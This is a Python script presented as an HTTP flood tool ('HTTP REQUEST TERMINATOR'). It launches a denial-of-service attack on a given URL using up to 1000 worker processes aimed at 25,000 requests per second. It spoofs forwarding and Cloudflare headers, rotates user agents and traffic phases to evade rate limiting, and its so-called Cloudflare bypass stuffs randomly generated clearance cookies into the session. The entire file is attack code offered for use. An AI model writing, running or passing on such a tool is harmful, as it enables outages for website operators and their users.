#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import time
import json
import sys
import os
import socket
import ssl
import uuid
import zlib
from multiprocessing import Process, Manager, cpu_count, Queue
from fake_useragent import UserAgent
from urllib.parse import urlparse, quote
from collections import deque
from concurrent.futures import ThreadPoolExecutor

MAX_RETRIES = 7
CONNECTION_TIMEOUT = 6
MAX_CONNECTIONS_PER_HOST = 250
TARGET_REQUESTS_PER_SECOND = 25000
WORKER_PROCESSES = min(1000, cpu_count() * 200)
USER_AGENT_ROTATION_FREQ = 30
REQUEST_TIMEOUT = aiohttp.ClientTimeout(total=15, connect=CONNECTION_TIMEOUT)
JITTER_RANGE = (0, 0.03)
CF_CHALLENGE_DELAY = (0.5, 5)
DNS_CACHE_TTL = 30
SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.set_ciphers('ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384')
SSL_CONTEXT.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
HTTP_VERSIONS = ['HTTP/1.1', 'HTTP/2']
CONNECTION_STRATEGIES = ['keep-alive', 'close']

BASE_HEADERS = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'TE': 'trailers',
}

user_agent_rotator = UserAgent()
cf_versions = ['2023.05', '2023.07', '2023.09', '2024.01', '2024.03', '2024.05']
cf_ray_prefixes = ['8', '7', '6', '9', '5', '4']
ip_countries = ['US', 'GB', 'DE', 'FR', 'CA', 'JP', 'BR', 'IN', 'AU', 'SG', 'NL', 'SE']
http_methods = ['GET', 'POST', 'OPTIONS', 'HEAD']
browser_versions = ['122.0.0.0', '121.0.0.0', '120.0.0.0', '119.0.0.0']
platforms = ['Windows NT 10.0', 'Windows NT 6.1', 'Macintosh', 'X11', 'Linux']

class TrafficPatternGenerator:
    @staticmethod
    def get_phase():
        phases = [
            {'rps': 800, 'duration': 45, 'jitter': 0.4},
            {'rps': 18000, 'duration': 150, 'jitter': 0.2},
            {'rps': 5000, 'duration': 90, 'jitter': 0.3},
            {'rps': 25000, 'duration': 60, 'jitter': 0.1}
        ]
        return random.choice(phases)

class CloudflareBypassUltra:
    @staticmethod
    def generate_headers():
        headers = BASE_HEADERS.copy()
        headers['User-Agent'] = f"Mozilla/5.0 ({random.choice(platforms)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(browser_versions)} Safari/537.36"
        headers['CF-IPCountry'] = random.choice(ip_countries)
        if random.random() > 0.25:
            headers['CF-Connecting-IP'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        if random.random() > 0.5:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        if random.random() > 0.7:
            headers['CF-Visitor'] = '{"scheme":"https"}'
            headers['CF-Ray'] = f"{random.choice(cf_ray_prefixes)}{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=16))}-{random.choice(['SJC', 'LAX', 'DFW', 'ORD', 'IAD', 'ATL', 'AMS', 'FRA', 'SIN', 'NRT'])}"
        if random.random() > 0.6:
            headers['Referer'] = f"https://www.{random.choice(['google', 'bing', 'yahoo', 'duckduckgo'])}.com/search?q={quote(''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(5,15))))}"
        headers['Sec-CH-UA'] = f'"Chromium";v="{random.randint(118,124)}", "Google Chrome";v="{random.randint(118,124)}", "Not=A?Brand";v="{random.randint(95,99)}"'
        headers['Sec-CH-UA-Mobile'] = '?0'
        headers['Sec-CH-UA-Platform'] = f'"{random.choice(["Windows", "macOS", "Linux"])}"'
        return headers

    @staticmethod
    async def solve_js_challenge(session, url):
        await asyncio.sleep(random.uniform(*CF_CHALLENGE_DELAY))
        session.cookie_jar.update_cookies({
            'cf_clearance': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=154)),
            '__cf_bm': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=142)),
            '__cflb': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=42))
        })
        session.headers.update({
            'CF-Client-Version': random.choice(cf_versions),
            'CF-Device-Type': random.choice(['desktop', 'mobile', 'tablet']),
            'CF-Access-Client-Id': str(uuid.uuid4()),
            'CF-Access-Client-Secret': ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=64))
        })
        return True

class RequestStatsUltra:
    def __init__(self):
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.cloudflare_challenges = 0
        self.start_time = time.time()
        self.last_print_time = self.start_time
        self.request_times = deque(maxlen=10000)
    
    def add_request(self, success, is_cf_challenge=False):
        self.total_requests += 1
        if success:
            self.successful_requests += 1
        else:
            self.failed_requests += 1
        if is_cf_challenge:
            self.cloudflare_challenges += 1
        self.request_times.append(time.time())
    
    def get_current_rps(self):
        if not self.request_times:
            return 0.0
        time_window = min(60, time.time() - self.request_times[0]) if self.request_times else 1
        return len(self.request_times) / time_window
    
    def get_stats(self):
        elapsed = max(1, time.time() - self.start_time)
        return {
            'total_requests': self.total_requests,
            'successful_requests': self.successful_requests,
            'failed_requests': self.failed_requests,
            'cloudflare_challenges': self.cloudflare_challenges,
            'requests_per_second': self.total_requests / elapsed,
            'current_rps': self.get_current_rps(),
            'success_rate': (self.successful_requests / self.total_requests) * 100 if self.total_requests else 0,
            'elapsed_time': elapsed,
        }

class ConnectionManager:
    @staticmethod
    def create_connector():
        return aiohttp.TCPConnector(
            limit=MAX_CONNECTIONS_PER_HOST,
            force_close=False,
            enable_cleanup_closed=True,
            ttl_dns_cache=DNS_CACHE_TTL,
            ssl=SSL_CONTEXT,
            use_dns_cache=True,
            keepalive_timeout=30
        )

async def make_request_ultra(session, url, stats):
    headers = CloudflareBypassUltra.generate_headers()
    retry_count = 0
    success = False
    
    await asyncio.sleep(random.uniform(*JITTER_RANGE))
    
    while retry_count < MAX_RETRIES and not success:
        try:
            method = random.choice(http_methods)
            async with session.request(method, url, headers=headers, timeout=REQUEST_TIMEOUT, ssl=SSL_CONTEXT) as response:
                content = await response.text()
                
                if response.status in [403, 429, 503] or "cloudflare" in content.lower() or "captcha" in content.lower():
                    stats.add_request(False, is_cf_challenge=True)
                    if await CloudflareBypassUltra.solve_js_challenge(session, url):
                        retry_count += 1
                        continue
                    else:
                        break
                
                if response.status >= 400:
                    stats.add_request(False)
                    retry_count += 1
                    await asyncio.sleep(random.uniform(0.3, 2.0))
                    continue
                
                stats.add_request(True)
                success = True
                
        except Exception:
            stats.add_request(False)
            retry_count += 1
            await asyncio.sleep(random.uniform(0.3, 2.5))
    
    return success

async def adaptive_worker(url, duration, stats, shared_stats):
    connector = ConnectionManager.create_connector()
    async with aiohttp.ClientSession(
        connector=connector,
        trust_env=True,
        headers=BASE_HEADERS,
        version=random.choice(HTTP_VERSIONS)
    ) as session:
        start_time = time.time()
        user_agent_counter = 0
        phase = TrafficPatternGenerator.get_phase()
        phase_start = time.time()
        
        while time.time() - start_time < duration:
            if time.time() - phase_start > phase['duration']:
                phase = TrafficPatternGenerator.get_phase()
                phase_start = time.time()
            
            if user_agent_counter >= USER_AGENT_ROTATION_FREQ:
                session.headers.update({'User-Agent': user_agent_rotator.random})
                user_agent_counter = 0
            
            await make_request_ultra(session, url, stats)
            user_agent_counter += 1
            
            if time.time() - stats.last_print_time >= 0.5:
                shared_stats.update(stats.get_stats())
                stats.last_print_time = time.time()
            
            await asyncio.sleep(random.uniform(0, phase['jitter']))

def process_worker_ultra(url, duration, shared_stats):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    stats = RequestStatsUltra()
    try:
        loop.run_until_complete(adaptive_worker(url, duration, stats, shared_stats))
    finally:
        loop.close()

class MetricsLoggerUltra:
    @staticmethod
    def log_stats(stats, save_json=False):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"\n{'='*60}")
        print(f"HTTP REQUEST TERMINATOR - HYPER ULTRA MODE")
        print(f"{'='*60}")
        print(f"Total Requests: {stats['total_requests']:,}")
        print(f"Successful: {stats['successful_requests']:,} ({stats['success_rate']:.2f}%)")
        print(f"Failed: {stats['failed_requests']:,}")
        print(f"CF Challenges: {stats['cloudflare_challenges']:,}")
        print(f"Avg RPS: {stats['requests_per_second']:,.2f}")
        print(f"Current RPS: {stats['current_rps']:,.2f}")
        print(f"Elapsed: {stats['elapsed_time']:.2f}s")
        print(f"{'='*60}")
        
        if save_json:
            with open(f"http_stats_hyper_ultra_{int(time.time())}.json", 'w') as f:
                json.dump(stats, f)

def validate_url_ultra(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def main_ultra():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <duration_in_seconds>")
        sys.exit(1)
    
    url = sys.argv[1]
    if not validate_url_ultra(url):
        print("Error: Invalid URL format")
        sys.exit(1)
    
    try:
        duration = float(sys.argv[2])
        if duration <= 0:
            raise ValueError
    except ValueError:
        print("Error: Duration must be positive seconds")
        sys.exit(1)
    
    print(f"Starting HYPER ULTRA attack on {url} for {duration} seconds...")
    print(f"Configuration: {WORKER_PROCESSES} workers, target {TARGET_REQUESTS_PER_SECOND:,} RPS")
    
    with Manager() as manager:
        shared_stats = manager.dict({
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'cloudflare_challenges': 0,
            'requests_per_second': 0.0,
            'current_rps': 0.0,
            'success_rate': 0.0,
            'elapsed_time': 0.0,
        })
        
        processes = []
        for _ in range(WORKER_PROCESSES):
            p = Process(target=process_worker_ultra, args=(url, duration, shared_stats))
            p.start()
            processes.append(p)
        
        try:
            start_time = time.time()
            while time.time() - start_time < duration:
                MetricsLoggerUltra.log_stats(dict(shared_stats))
                time.sleep(0.2)
            
            for p in processes:
                p.join(timeout=2)
                if p.is_alive():
                    p.terminate()
            
            MetricsLoggerUltra.log_stats(dict(shared_stats), save_json=True)
            print("\nHYPER ULTRA attack completed!")
            
        except KeyboardInterrupt:
            print("\nTerminating HYPER ULTRA attack...")
            for p in processes:
                p.terminate()
            
            MetricsLoggerUltra.log_stats(dict(shared_stats), save_json=True)

if __name__ == "__main__":
    main_ultra()